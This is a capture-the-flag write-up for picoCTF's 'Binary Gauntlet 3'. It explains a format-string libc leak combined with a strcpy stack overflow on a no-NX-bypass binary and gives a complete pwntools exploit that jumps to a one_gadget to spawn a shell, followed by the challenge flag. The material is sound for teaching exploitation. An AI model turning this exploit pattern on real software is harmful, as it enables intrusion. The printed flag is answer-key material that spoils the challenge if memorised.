# Binary Gauntlet 3

## Description

Author: madStacks

The stack is no longer executable.
gauntlet nc -v mercury.picoctf.net 4932
The flag for this challenge does not include the standard picoCTF{} wrapper.

## Challenge

The binary seems identical to the previous challenge, except that NX is now enabled.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Decompiled code

```c
undefined8 main(undefined8 argc, char **argv)
{
    char **var_80h;
    int64_t var_74h;
    char *format;
    
    var_74h._0_4_ = (undefined4)argc;
    format = (char *)sym.imp.malloc(1000);
    sym.imp.fgets(format, 1000, _reloc.stdin);
    format[999] = '\0';
    sym.imp.printf(format);
    sym.imp.fflush(_reloc.stdout);
    sym.imp.fgets(format, 1000, _reloc.stdin);
    format[999] = '\0';
    sym.imp.strcpy((int64_t)&var_74h + 4, format, format);
    return 0;
}
```

## Solution

We can no longer write our own shellcode to the stack and execute it due to NX being enabled.

It is difficult to use a ROP chain as `strcpy` will stop on the first nullbyte, and there are almost always nullbytes in addresses, which are required for a ROP chain.

Using the format string vulnerability, we can leak the address of `__libc_start_main_ret`, which we can use to find the version of libc as well as the base address.
To do so, we can use a database search tool such as [libc.blukat.me](https://libc.blukat.me/?q=__libc_start_main_ret%3Abf7&l=libc6_2.27-3ubuntu1.4_amd64).

Once we have the version and base address, we can search for one gadgets:

```
-> % one_gadget libc6_2.27-3ubuntu1.4_amd64.so 
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

I chose the second one gadget in this example, but others may work.
Once I verified that the contraint was met while debugging the program, I used `strcpy` to replace the return address with the address of the one gadget, spawning a shell and allowing me to read the flag file.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./gauntlet")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("mercury.picoctf.net", 22595)


def main():
    r = conn()

    if args.LOCAL:
        context.terminal = ["tmux", "splitw", "-h"]
        #gdb.attach(r, 'b*0x00400727')

    r.sendline('%p ' * 23)

    LibcRet = int(r.recvline().decode().split()[22], 0)

    print(LibcRet)

    LibcBase = LibcRet - 0x021bf7;
    OneGadget = LibcBase + 0x4f432;

    payload = flat({
        0x78: OneGadget,
    })

    print(payload)

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag

`ca4593c0678903b464ed666fa4a9f676`

